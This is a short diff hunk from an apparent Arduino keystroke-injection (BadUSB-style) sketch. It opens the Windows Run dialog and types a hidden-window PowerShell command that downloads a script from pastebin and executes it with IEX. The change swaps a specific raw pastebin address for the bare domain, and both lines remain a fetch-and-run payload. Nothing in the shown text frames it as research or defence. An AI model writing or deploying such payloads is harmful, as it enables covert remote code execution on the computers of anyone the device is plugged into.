@@ -24,7 +24,7 @@ void loop() {
   Keyboard.press('r');
   Keyboard.releaseAll();
   delay(1500);
-  Keyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/tUWtSWb7');\"");
+  Keyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com');\"");
   delay(100);
   Keyboard.press(KEY_RETURN);
   Keyboard.end();
